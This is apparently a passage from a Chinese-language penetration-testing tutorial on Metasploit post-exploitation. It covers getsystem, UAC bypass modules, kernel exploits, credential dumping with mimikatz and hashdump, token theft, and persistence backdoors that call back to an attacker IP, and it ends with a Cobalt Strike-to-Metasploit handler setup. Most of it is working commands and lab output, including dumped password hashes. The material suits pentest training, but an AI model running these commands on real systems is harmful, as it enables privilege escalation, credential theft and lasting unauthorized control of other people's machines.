②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。
③Windows服务已启动，导致与命名管道建立连接。
④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。
然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。

```bash
getsystem  
```

2.bypassuac
用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。

msf提供了如下几个模块帮助绕过UAC：

```bash
msf5 auxiliary(server/socks5) > search bypassuac

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
```

使用方法类似，运行后返回一个新的会话，**需要再次执行getsystem获取系统权限**

```bash
# 示例
meterpreter > getuid
Server username: SAUCERMAN\TideSec
meterpreter > background
[*] Backgrounding session 4...
msf5 exploit(multi/handler) >  use exploit/windows/local/bypassuac
msf5 exploit(windows/local/bypassuac) > set SESSION 4
SESSION => 4
msf5 exploit(windows/local/bypassuac) > run

[-] Handler failed to bind to 192.168.81.160:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Sending stage (206403 bytes) to 192.168.81.154
[*] Meterpreter session 5 opened (192.168.81.160:4444 -> 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700
[-] Exploit failed [timeout-expired]: Timeout::Error execution expired
[*] Exploit completed, but no session was created.

# 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功
# 然鹅这里失败了
```

3.内核漏洞提权

无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。

```bash
meterpreter > run post/windows/gather/enum_patches  #查看补丁信息
msf5 > use exploit/windows/local/ms13_053_schlamperei
msf5 > set SESSION 2
msf5 > exploit

# 示例
meterpreter > run post/windows/gather/enum_patches

[+] KB2871997 is missing
[+] KB2928120 is missing
[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008
[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
meterpreter > background
[*] Backgrounding session 4...
msf5 exploit(windows/local/bypassuac) > search MS13-081

Matching Modules
================

   #  Name                                             Disclosure Date  Rank     Check  Description
   -  ----                                             ---------------  ----     -----  -----------
   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page


msf5 exploit(windows/local/bypassuac) > use exploit/windows/local/ms13_081_track_popup_menu
msf5 exploit(windows/local/ms13_081_track_popup_menu) > set session 4
session => 4
msf5 exploit(windows/local/ms13_081_track_popup_menu) > exploit

[!] SESSION may not be compatible with this module.
[-] Handler failed to bind to 192.168.81.160:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported
[*] Exploit completed, but no session was created.
# 然鹅失败了，摸摸头
```

###  获取凭证

在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。

1.使用mimikatz

```bash
load mimikatz    #help mimikatz 查看帮助
wdigest  #获取Wdigest密码
mimikatz_command -f samdump::hashes  #执行mimikatz原始命令
mimikatz_command -f sekurlsa::searchPasswords

# 示例
meterpreter > load mimikatz
Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?
Success.
meterpreter > wdigest
[!] Not currently running as SYSTEM
[*] Attempting to getprivs ...
[+] Got SeDebugPrivilege.
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID    Package    Domain        User           Password
------    -------    ------        ----           --------
0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
0;996     Negotiate  WORKGROUP     SAUCERMAN$     
0;48748   NTLM                                    
0;999     NTLM       WORKGROUP     SAUCERMAN$     
0;476238  NTLM       SAUCERMAN     TideSec        123456
0;476209  NTLM       SAUCERMAN     TideSec        123456

meterpreter > mimikatz_command -f samdump::hashes
Ordinateur : saucerman
BootKey    : 691cff33caf49e933be97fcee370256a
RegOpenKeyEx SAM : (0x00000005) �ݿ� 
Erreur lors de l'exploration du registre
meterpreter > mimikatz_command -f sekurlsa::searchPasswords
[0] { TideSec ; SAUCERMAN ; 123456 }
[1] { TideSec ; SAUCERMAN ; 123456 }
[2] { SAUCERMAN ; TideSec ; 123456 }
[3] { SAUCERMAN ; TideSec ; 123456 }
[4] { TideSec ; SAUCERMAN ; 123456 }
[5] { TideSec ; SAUCERMAN ; 123456 }
```

1. 使用meterpreter的run hashdump命令

```bash
meterpreter > run hashdump

[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Dumping password hints...

TideSec:"123456"

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
```

3.post/windows/gather/smart_hashdump

从上面也可以看出官方推荐`post/windows/gather/smart_hashdump`

```bash
meterpreter > run post/windows/gather/smart_hashdump

[*] Running module against SAUCERMAN
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*]     Obtaining the boot key...
[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...
[*]     Obtaining the user list and keys...
[*]     Decrypting user keys...
[*]     Dumping password hints...
[+]     TideSec:"123456"
[*]     Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
```

4.powerdump
同 hashdump，但失败了

```bash
meterpreter > run powerdump
[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...
[*] Running PowerDump to extract Username and Password Hashes...
[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...
[*] Setting ExecutionPolicy to Unrestricted...
[*] Dumping the SAM database through PowerShell...

[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.
```

###  假冒令牌

在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。

msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。

```bash
# 1.incognito假冒令牌
use incognito      #help incognito  查看帮助
list_tokens -u    #查看可用的token
impersonate_token 'NT AUTHORITY\SYSTEM'  #假冒SYSTEM token
或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\
execute -f cmd.exe -i –t    # -t 使用假冒的token 执行
或者直接shell
rev2self   #返回原始token

# 2.steal_token窃取令牌
steal_token <pid值>   #从指定进程中窃取token   先ps,找域控进程
drop_token  #删除窃取的token
```

###  植入后门

Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。

1.persistence启动项后门

路径：metasploit/scripts/meterpreter/persistence

原理是在`C:\Users***\AppData\Local\Temp\`目录下，上传一个vbs脚本，在注册表`HKLM\Software\Microsoft\Windows\CurrentVersion\Run\`加入开机启动项，**很容易被杀软拦截，官方不推荐**

```bash
run persistence –h  #查看帮助
run persistence -X -i 5 -p 4444 -r 192.168.81.160
#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip
# 示例
meterpreter > run persistence -X -i 5 -p 4444 -r 192.168.81.160

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Running Persistence Script
[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444
[*] Persistent agent script is 99630 bytes long
[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs
[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs
[+] Agent executed with PID 3540
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua
```

能实现同样功能的脚本还有：exploit/windows/local/persistence

2.metsvc服务后门

在C:\Users***\AppData\Local\Temp\目录下，上传一个vbs脚本
在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。**通过服务启动，需要管理员权限，官方不推荐使用，运行失败**

```bash
run metsvc –A   #自动安装后门

# 示例
meterpreter > run metsvc –A

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
    Cannot open service manager (0x00000005)

meterpreter > ls
Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH
========================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll
100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe
100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe
```

三个文件上传成功，但服务没有启动起来，失败了。使用`-r`参数可卸载服务。

3.persistence_exe

再来看看官方推荐的东西吧

```bash
meterpreter > info post/windows/manage/persistence_exe

       Name: Windows Manage Persistent EXE Payload Installer
     Module: post/windows/manage/persistence_exe
   Platform: Windows
       Arch: 
       Rank: Normal

Provided by:
  Merlyn drforbin Cousins <drforbin6@gmail.com>

Compatible session types:
  Meterpreter

Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  REXENAME  default.exe      yes       The name to call exe on remote system
  REXEPATH                   yes       The remote executable to upload and execute.
  SESSION                    yes       The session to run this module on.
  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)

Description:
  This Module will upload an executable to a remote host and make it 
  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER 
  will start on user login, SYSTEM will start on system boot but 
  requires privs. SERVICE will create a new service which will start 
  the payload. Again requires privs.



Module options (post/windows/manage/persistence_exe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   REXENAME  default.exe      yes       The name to call exe on remote system
   REXEPATH                   yes       The remote executable to upload and execute.
   SESSION                    yes       The session to run this module on.
   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)
```

此模块将可执行文件上载到远程主机并进行创建持久性。
涉及到四个参数

- REXENAME是拷贝到目标系统中的名字
- EXEPATH是将要上传的后门在本地的位置
- SESSION是选择运行此模块的会话
- STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。

尝试一下：

```bash
meterpreter > run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER

[*] Running module against SAUCERMAN
[*] Reading Payload from file /home/ubuntu/shell.exe
[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe
[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe
[+] Agent executed with PID 3684
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI
[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc
```

4.registry_persistence

完整路径为exploit/windows/local/registry_persistence

和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。

```bash
meterpreter > background
[*] Backgrounding session 13...
msf5 auxiliary(server/socks5) > use exploit/windows/local/registry_persistence
msf5 exploit(windows/local/registry_persistence) > show options

Module options (exploit/windows/local/registry_persistence):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)
   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)
   CREATE_RC      true             no        Create a resource file for cleanup
   RUN_NAME                        no        The name to use for the 'Run' key. (Default: random)
   SESSION                         yes       The session to run this module on.
   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)
   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/local/registry_persistence) > set SESSION 13
SESSION => 13
msf5 exploit(windows/local/registry_persistence) > run

[*] Generating payload blob..
[+] Generated payload, 6048 bytes
[*] Root path is HKCU
[*] Installing payload blob..
[+] Created registry key HKCU\Software\0BaG3zDR
[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD
[*] Installing run key
[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB
[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc
```

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。



# cs大全

cs派生msf

```bash

msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_http
msf exploit(handler) > set lhost 192.168.0.143
msf exploit(handler) > set lport 4444
msf exploit(handler) > exploit

cs创建一个windows/foreign/reverse_http的 Listener
然后选中对应机器，右键->Spawn，选择刚刚创建的监听器。
```




